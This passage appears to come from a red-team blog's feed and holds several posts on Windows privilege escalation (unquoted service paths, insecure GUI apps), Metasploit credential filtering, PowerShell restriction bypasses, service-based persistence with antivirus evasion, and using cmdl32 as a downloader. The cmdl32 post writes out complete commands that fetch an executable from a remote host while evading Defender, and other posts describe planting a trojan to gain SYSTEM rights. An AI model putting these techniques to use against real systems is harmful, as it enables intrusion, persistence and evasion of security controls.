punctuation">(</span>IO<span class="token punctuation">)</span><span class="token punctuation">(</span>F<span class="token punctuation">)</span>                         BUILTIN\Users:<span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>RX<span class="token punctuation">)</span>                         BUILTIN\Users:<span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>OI<span class="token punctuation">)</span><span class="token punctuation">(</span>CI<span class="token punctuation">)</span><span class="token punctuation">(</span>IO<span class="token punctuation">)</span><span class="token punctuation">(</span>GR<span class="token punctuation">,</span>GE<span class="token punctuation">)</span>                         CREATOR OWNER:<span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>OI<span class="token punctuation">)</span><span class="token punctuation">(</span>CI<span class="token punctuation">)</span><span class="token punctuation">(</span>IO<span class="token punctuation">)</span><span class="token punctuation">(</span>F<span class="token punctuation">)</span>                         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:<span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>RX<span class="token punctuation">)</span>                         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:<span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>OI<span class="token punctuation">)</span><span class="token punctuation">(</span>CI<span class="token punctuation">)</span><span class="token punctuation">(</span>IO<span class="token punctuation">)</span><span class="token punctuation">(</span>GR<span class="token punctuation">,</span>GE<span class="token punctuation">)</span>                         APPLICATION PACKAGE AUTHORITY\���������Ƶ�Ӧ�ó����:<span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>RX<span class="token punctuation">)</span>                         APPLICATION PACKAGE AUTHORITY\���������Ƶ�Ӧ�ó����:<span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>OI<span class="token punctuation">)</span><span class="token punctuation">(</span>CI<span class="token punctuation">)</span><span class="token punctuation">(</span>IO<span class="token punctuation">)</span><span class="token punctuation">(</span>GR<span class="token punctuation">,</span>GE<span class="token punctuation">)</span>Successfully processed 1 files<span class="token punctuation">;</span> Failed processing 0 files<span class="token function">PS</span> C:\Users\y> icacls <span class="token string">"C:\Program Files\My Data\My Service"</span>icacls <span class="token string">"C:\Program Files\My Data\My Service"</span>C:\Program Files\My <span class="token keyword">Data</span>\My Service NT SERVICE\TrustedInstaller:<span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>F<span class="token punctuation">)</span>                                    NT SERVICE\TrustedInstaller:<span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>CI<span class="token punctuation">)</span><span class="token punctuation">(</span>IO<span class="token punctuation">)</span><span class="token punctuation">(</span>F<span class="token punctuation">)</span>                                    NT AUTHORITY\SYSTEM:<span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>F<span class="token punctuation">)</span>                                    NT AUTHORITY\SYSTEM:<span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>OI<span class="token punctuation">)</span><span class="token punctuation">(</span>CI<span class="token punctuation">)</span><span class="token punctuation">(</span>IO<span class="token punctuation">)</span><span class="token punctuation">(</span>F<span class="token punctuation">)</span>                                    BUILTIN\Administrators:<span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>F<span class="token punctuation">)</span>                                    BUILTIN\Administrators:<span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>OI<span class="token punctuation">)</span><span class="token punctuation">(</span>CI<span class="token punctuation">)</span><span class="token punctuation">(</span>IO<span class="token punctuation">)</span><span class="token punctuation">(</span>F<span class="token punctuation">)</span>                                    BUILTIN\Users:<span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>RX<span class="token punctuation">)</span>                                    BUILTIN\Users:<span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>OI<span class="token punctuation">)</span><span class="token punctuation">(</span>CI<span class="token punctuation">)</span><span class="token punctuation">(</span>IO<span class="token punctuation">)</span><span class="token punctuation">(</span>GR<span class="token punctuation">,</span>GE<span class="token punctuation">)</span>                                    CREATOR OWNER:<span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>OI<span class="token punctuation">)</span><span class="token punctuation">(</span>CI<span class="token punctuation">)</span><span class="token punctuation">(</span>IO<span class="token punctuation">)</span><span class="token punctuation">(</span>F<span class="token punctuation">)</span>                                    APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:<span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>RX<span class="token punctuation">)</span>                                    APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:<span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>OI<span class="token punctuation">)</span><span class="token punctuation">(</span>CI<span class="token punctuation">)</span><span class="token punctuation">(</span>IO<span class="token punctuation">)</span><span class="token punctuation">(</span>GR<span class="token punctuation">,</span>GE<span class="token punctuation">)</span>                                    APPLICATION PACKAGE AUTHORITY\���������Ƶ�Ӧ�ó����:<span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>RX<span class="token punctuation">)</span>                                    APPLICATION PACKAGE AUTHORITY\���������Ƶ�Ӧ�ó����:<span class="token punctuation">(</span>I<span class="token punctuation">)</span><span class="token punctuation">(</span>OI<span class="token punctuation">)</span><span class="token punctuation">(</span>CI<span class="token punctuation">)</span><span class="token punctuation">(</span>IO<span class="token punctuation">)</span><span class="token punctuation">(</span>GR<span class="token punctuation">,</span>GE<span class="token punctuation">)</span>Successfully processed 1 files<span class="token punctuation">;</span> Failed processing 0 files<span class="token function">PS</span> C:\Users\y>找到BUILTIN\Users对C:\Program Files\My <span class="token keyword">Data</span>具备写权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Unquoted%20Service%20Path%20Windows%20Privilege%20Promotion/image-20211107171413693.png" alt="image-20211107171413693"></p><h4 id="winPEASx64-exe"><a href="#winPEASx64-exe" class="headerlink" title="winPEASx64.exe"></a>winPEASx64.exe</h4><pre class="line-numbers language-none"><code class="language-none">Again, the utility auto script enumerates the related paths with the same result as the previous tool<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Unquoted%20Service%20Path%20Windows%20Privilege%20Promotion/image-20211107172137758.png" alt="image-20211107172137758"></p><h4 id="Using-the-details"><a href="#Using-the-details" class="headerlink" title="Using the details"></a>Using the details</h4><pre class="line-numbers language-none"><code class="language-none">Write the Trojan horse to the C: Program Files\My Data directory, and prove that the current user is UsersNote that 13330.exe is different from the port I use to go online. In fact, I need to rename 13330.exe to my.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Unquoted%20Service%20Path%20Windows%20Privilege%20Promotion/image-20211107172555242.png" alt="image-20211107172555242"></p><pre class="line-numbers language-none"><code class="language-none">Obtain system permissions as follows, after start services<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Unquoted%20Service%20Path%20Windows%20Privilege%20Promotion/image-20211107174312601.png" alt="image-20211107174312601"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Unquoted%20Service%20Path%20Windows%20Privilege%20Promotion/image-20211107174401546.png" alt="image-20211107174401546"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Windows Privilege Promotion </tag>
            
            <tag> LPE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Insecure GUI Application Windows Privilege Promotion</title>
      <link href="2021/11/07/insecure-gui-application-windows-privilege-promotion/"/>
      <url>2021/11/07/insecure-gui-application-windows-privilege-promotion/</url>
      
        <content type="html"><![CDATA[<h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">Elevated privileges in application to try here, part of the GUI application to current higher outside of the current user permissions to access certain services, for our right to provide some convenience, when the terminal can&#39;t through the access permissions, spend more time looking for unsafe configuration GUI programs of this type are very much worth it<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><pre class="line-numbers language-none"><code class="language-none">Here to notepad in Win10 use as a case, to illustrate, here to log in to the system as an administrator, check personal permissions, only 5 permissions information as follows<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Insecure%20GUI%20Application%20Windows%20Privilege%20Promotion/image-20211106172808300.png" alt="image-20211106172808300"></p><pre class="line-numbers language-none"><code class="language-none">Try adding a user to verify the current user&#39;s permissions. It&#39;s simple. The current user does not have higher permissions to add users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Insecure%20GUI%20Application%20Windows%20Privilege%20Promotion/image-20211106172858371.png" alt="image-20211106172858371"></p><pre class="line-numbers language-none"><code class="language-none">Note This section uses Notepad as an example to describe how to run an unsafe configuration operation as an administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Insecure%20GUI%20Application%20Windows%20Privilege%20Promotion/image-20211106172957533.png" alt="image-20211106172957533"></p><pre class="line-numbers language-none"><code class="language-none">After further exploring the function of Notepad, it can be known that you can enter the resource manager to select the file and open the file for us. Note that because we have selected the permission to run as administrator above, if you can open CMD or run other executable programs, you will run the file with high permission. At this time we can try to open the file resource manager runs within our target<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Insecure%20GUI%20Application%20Windows%20Privilege%20Promotion/image-20211106173218068.png" alt="image-20211106173218068"></p><pre class="line-numbers language-none"><code class="language-none">Progress to view its user permissions<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Insecure%20GUI%20Application%20Windows%20Privilege%20Promotion/image-20211106173258852.png" alt="image-20211106173258852"></p><pre class="line-numbers language-none"><code class="language-none">I am sure you know how to continue to use it<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Insecure%20GUI%20Application%20Windows%20Privilege%20Promotion/image-20211106173429767.png" alt="image-20211106173429767"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Windows Privilege Promotion </tag>
            
            <tag> LPE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>The Msf Creds Note</title>
      <link href="2021/11/07/the-msf-creds-note/"/>
      <url>2021/11/07/the-msf-creds-note/</url>
      
        <content type="html"><![CDATA[<h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">We all know that there is a PostSQL database under MSF for actual use, which stores host and vulnerability information, as well as a way to store all kinds of account passwords, namely CREDSCreds contains the target host, account, password and other credentials information, if you like me have been open database, blasting out a lot of results, each time it is not convenient to find, then this time will record some simple filtering, so as to improve efficiency and save time<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><pre class="line-numbers language-none"><code class="language-none">Basic use, start the databasemsfdb initViewing credentialscreds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/The%20Msf%20Creds%20Note/image-20211107153953180.png" alt="image-20211107153953180.png"></p><pre class="line-numbers language-none"><code class="language-none">It will be much more difficult to identify and search a single target through a large amount of data information generated after blasting. Here creDS is used for relevant sorting, so as to quickly search our target usersSome ways like this<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Username"><a href="#Username" class="headerlink" title="Username"></a>Username</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Filter by user namemsf6 <span class="token operator">></span> creds -u liXXXXCredentials<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token function">host</span>           origin         <span class="token function">service</span>            public  private   realm  private_type  JtR Format----           ------         -------            ------  -------   -----  ------------  ----------X.X.X.X  X.X.X.X  <span class="token number">443</span>/tcp <span class="token punctuation">(</span>owa_ews<span class="token punctuation">)</span>  liXXXX   XXXXXXXXXXXX3         Password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/The%20Msf%20Creds%20Note/image-20211107154351656.png" alt="image-20211107154351656"></p><h3 id="Type"><a href="#Type" class="headerlink" title="Type"></a>Type</h3><pre class="line-numbers language-none"><code class="language-none">Filter by typemsf6 &gt; creds -t *[-] Unrecognized credential type * -- must be one of password,ntlm,hash,afs,bf,bf-opencl,bfegg,bsdi,crc32,des,django,dmd5,dominosec,dragonfly3-32,dragonfly3-64,dragonfly4-32,dragonfly4-64,drupal7,dummy,dynamic_n,epi,episerver,gost,hdaa,hmac-md5,hmac-sha1,hmac-sha224,hmac-sha256,hmac-sha384,hmac-sha512,hmailserver,ipb2,keepass,keychain,krb4,krb5,lm,lotus5,md4-gen,md5,md5crypt-opencl,md5ns,mediawiki,mscash,mscash2,mscash2-opencl,mschapv2,mskrb5,mssql,mssql05,mysql,mysql-sha1,mysql-sha1-opencl,nethalflm,netlm,netlmv2,netntlm,netntlmv2,nsldap,nt,nt-opencl,nt2,odf,office,oracle,oracle11,osc,pdf,phpass,phpass-opencl,phps,pix-md5,pkzip,po,pwsafe,pwsafe-opencl,racf,rar,raw-md4,raw-md4-opencl,raw-md5,raw-md5-opencl,raw-md5u,raw-sha,raw-sha1,raw-sha1-linkedin,raw-sha1-ng,raw-sha1-opencl,raw-sha224,raw-sha256,raw-sha384,raw-sha512,raw-sha512-opencl,salted-sha1,sapb,sapg,sha1-gen,sha256crypt,sha512crypt,sha512crypt-opencl,sip,ssh,ssha-opencl,sybasease,trip,vnc,wbb3,wpapsk,wpapsk-opencl,xsha,xsha512,xsha512-opencl,zipmsf6 &gt; creds -t sshCredentials&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;host  origin  service  public  private  realm  private_type  JtR Format----  ------  -------  ------  -------  -----  ------------  ----------msf6 &gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/The%20Msf%20Creds%20Note/image-20211107154615967.png" alt="image-20211107154615967"></p><pre class="line-numbers language-none"><code class="language-none">msf6 &gt; creds -t ntlm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/The%20Msf%20Creds%20Note/image-20211107154905143.png" alt="image-20211107154905143"></p><h3 id="Port"><a href="#Port" class="headerlink" title="Port"></a>Port</h3><pre class="line-numbers language-none"><code class="language-none">Filter by portmsf6 &gt; creds -p 445<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/The%20Msf%20Creds%20Note/image-20211107154957039.png" alt="image-20211107154957039"></p><h3 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h3><pre class="line-numbers language-none"><code class="language-none">Filter by ipThere are two ways to do this in the help information  creds 1.2.3.4&#x2F;24    # Return credentials with logins in this range  creds -O 1.2.3.4&#x2F;24 # Return credentials with origins in this range  Here&#39;s an examplemsf6 &gt; creds -O X.X.X.X<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/The%20Msf%20Creds%20Note/image-20211107155251193.png" alt="image-20211107155251193"></p><h3 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h3><pre class="line-numbers language-none"><code class="language-none">Filter by servicemsf6 &gt; creds -s smb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/The%20Msf%20Creds%20Note/image-20211107155352239.png" alt="image-20211107155352239"></p><h3 id="Export"><a href="#Export" class="headerlink" title="Export"></a>Export</h3><pre class="line-numbers language-none"><code class="language-none">msf6 &gt; creds -o yangsirtest.csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/The%20Msf%20Creds%20Note/image-20211107155457798.png" alt="image-20211107155457798"></p>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> MSF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Powershell Constrained Language Mode Bypass</title>
      <link href="2021/11/06/powershell-constrained-language-mode-bypass/"/>
      <url>2021/11/06/powershell-constrained-language-mode-bypass/</url>
      
        <content type="html"><![CDATA[<h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">Unlike executing scripts.\1.ps1, this Constrained Language mode limits powershell&#39;s function advantages when executing complex statements, such as password capture with MimikatzThe official details are as follows<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><pre class="line-numbers language-none"><code class="language-none">Enabling the policy as follows directly changes system environment variables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20Constrained%20Language%20Mode%20Bypass/image-20211106133634570.png"></p><pre class="line-numbers language-none"><code class="language-none">Checking constrained language mode:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20Constrained%20Language%20Mode%20Bypass/image-20211106134226674.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20Constrained%20Language%20Mode%20Bypass/image-20211106134539038.png"></p><pre class="line-numbers language-none"><code class="language-none">Maybe in your redteam attack you can to use the ps1&#39;s mimikatz to caputre, then you want to download the ps1 script, now you will be fail like this <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20Constrained%20Language%20Mode%20Bypass/image-20211106134433707.png"></p><pre class="line-numbers language-none"><code class="language-none">Of course, if you have enough permissions, you can directly modify the environment variables, modify the relevant mode, and then open a PowerShell to bypass, if you do not have enough permissions, but can downgrade to PowerShell2, to bypass the restricted language mode, the effect is as follows<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20Constrained%20Language%20Mode%20Bypass/image-20211106135040754.png"></p>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
            <tag> Powershell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Powershell Without Powershell.exe Bypass</title>
      <link href="2021/11/06/powershell-without-powershell-exe/"/>
      <url>2021/11/06/powershell-without-powershell-exe/</url>
      
        <content type="html"><![CDATA[<h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">Powershell cannot be used during Intranet penetration of red team personnel. The tool or script you want to use is not supported by CMD. What should I do then? Here&#39;s a tip to get around powershell.exe disabling and use Powershell properly.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><pre class="line-numbers language-none"><code class="language-none">Use DLL version of powershell to execute, so as to effectively bypass the disabled EXE, first look at the effect as follows;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20Without%20Powershell.exe/image-20211106132305898.png"></p><pre class="line-numbers language-none"><code class="language-none">By the way:Before, the environment encountered a scenario where Powershell was disabled. Copy the original powershell. Exe of the system, use tools to modify part of the character strings, and then double click to run, but the disabled policy can still be bypassed and the command can be executed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
            <tag> Powershell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows Service Auto Start(BypassAV)</title>
      <link href="2021/11/05/windows-service-auto-start-bypassav/"/>
      <url>2021/11/05/windows-service-auto-start-bypassav/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><pre class="line-numbers language-none"><code class="language-none">先前写了下代码层面实现psexec功能点，其中包含建立服务、启动服务功能模块，发现也是个拿来做命令执行或者后门的好方法，此处单独利用windows服务实现开机自启动，增加权限维持杀软对抗思路先看实现效果，添加服务免杀效果如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Windows%20Service%20Auto%20Start(BypassAV)/image-20211105211254595.png" alt="image-20211105211254595"></p><pre class="line-numbers language-none"><code class="language-none">添加服务并上线效果如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Windows%20Service%20Auto%20Start(BypassAV)/image-20211105210207149.png" alt="image-20211105210207149"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Windows%20Service%20Auto%20Start(BypassAV)/image-20211105210252245.png" alt="image-20211105210252245"></p><pre class="line-numbers language-none"><code class="language-none">自启动上线如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Windows%20Service%20Auto%20Start(BypassAV)/image-20211105210514263.png" alt="image-20211105210514263"></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">OpenSCManager开服务管理数据库，CreateService创建服务，StartService启动服务关键核心代码在于CreateService：        XXX, &#x2F;&#x2F;OpenSCManager返回          lpwsServiceName, &#x2F;&#x2F; 要安装的服务的名称        lpwsServiceName, &#x2F;&#x2F; 用户界面程序用来标识服务的显示名称        SERVICE_ALL_ACCESS, &#x2F;&#x2F; 访问权限        SERVICE_WIN32_OWN_PROCESS, &#x2F;&#x2F;  在自己的进程中        SERVICE_AUTO_START, &#x2F;&#x2F;关键在于自启动  SERVICE_BOOT_START内核自启动  SERVICE_DEMAND_START手动自启动  SERVICE_SYSTEM_START自启动（内核服务）        SERVICE_ERROR_NORMAL, &#x2F;&#x2F; 启动程序在事件日志中记录错误，但继续启动操作        lpwsServicePath, &#x2F;&#x2F;exe路径        NULL,        NULL,        L&quot;&quot;,        NULL,        L&quot;&quot;);获取工具直达：https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;YangsirRedTeamTools<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
            <tag> Windows Service </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cmdl32代替certutil从而绕过杀软</title>
      <link href="2021/11/05/cmdl32-dai-ti-certutil-cong-er-rao-guo-sha-ruan/"/>
      <url>2021/11/05/cmdl32-dai-ti-certutil-cong-er-rao-guo-sha-ruan/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><pre class="line-numbers language-none"><code class="language-none">cmdl32.exe，CMAK（连接管理器管理工具包）使用它来设置连接管理器服务配置文件。配置文件通常打包成一个.exe，可以部署到用户系统，该软件包安装可用于启动拨号&#x2F;VPN连接的配置文件此处可以使用他来做一个下载器进行远程文件下载<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/cmdl32tobypassav/image-20211105112812217.png" alt="image-20211105112812217"></p><h2 id="实际使用"><a href="#实际使用" class="headerlink" title="实际使用"></a>实际使用</h2><pre class="line-numbers language-none"><code class="language-none">常规的certutil已被杀软所监测，查杀情况如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/cmdl32tobypassav/image-20211105113043797.png" alt="image-20211105113043797"></p><pre class="line-numbers language-none"><code class="language-none">此处利用cmdl32进行杀软绕过，从而远程下载文件settings.txt配置文件[Connection Manager]CMSFile&#x3D;settings.txtServiceName&#x3D;WindowsUpdateTunnelFile&#x3D;settings.txt[Settings]UpdateUrl&#x3D;http:&#x2F;&#x2F;192.168.122.1:8888&#x2F;1.exe命令行使用如下，本地生成相关配置文件icacls %cd% &#x2F;deny %username%:(OI)(CI)(DE,DC)set tmp&#x3D;%cd%echo [Connection Manager] &gt; settings.txtecho CMSFile&#x3D;settings.txt &gt;&gt; settings.txtecho ServiceName&#x3D;WindowsUpdate &gt;&gt; settings.txtecho TunnelFile&#x3D;settings.txt  &gt;&gt; settings.txtecho [Settings]  &gt;&gt; settings.txtecho UpdateUrl&#x3D;http:&#x2F;&#x2F;192.168.122.1:8888&#x2F;1.exe  &gt;&gt; settings.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/cmdl32tobypassav/image-20211105113350856.png" alt="image-20211105113350856"></p><pre class="line-numbers language-none"><code class="language-none">直接进行下载，defender无反应cmdl32 &#x2F;vpn &#x2F;lan %cd%\settings.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/cmdl32tobypassav/image-20211105113538408.png" alt="image-20211105113538408"></p><pre class="line-numbers language-none"><code class="language-none">还原后，再通过move重命名即可icacls %cd% &#x2F;remove:d %username%move VPND6A8.tmp fscan64.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/cmdl32tobypassav/image-20211105113819900.png" alt="image-20211105113819900"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/cmdl32tobypassav/image-20211105113902214.png" alt="image-20211105113902214"></p>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
            <tag> cmdl32 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实现&amp;利用命名管道补充&amp;令牌模拟</title>
      <link href="2021/11/04/shi-xian-li-yong-ming-ming-guan-dao-bu-chong-ling-pai-mo-ni/"/>
      <url>2021/11/04/shi-xian-li-yong-ming-ming-guan-dao-bu-chong-ling-pai-mo-ni/</url>
      
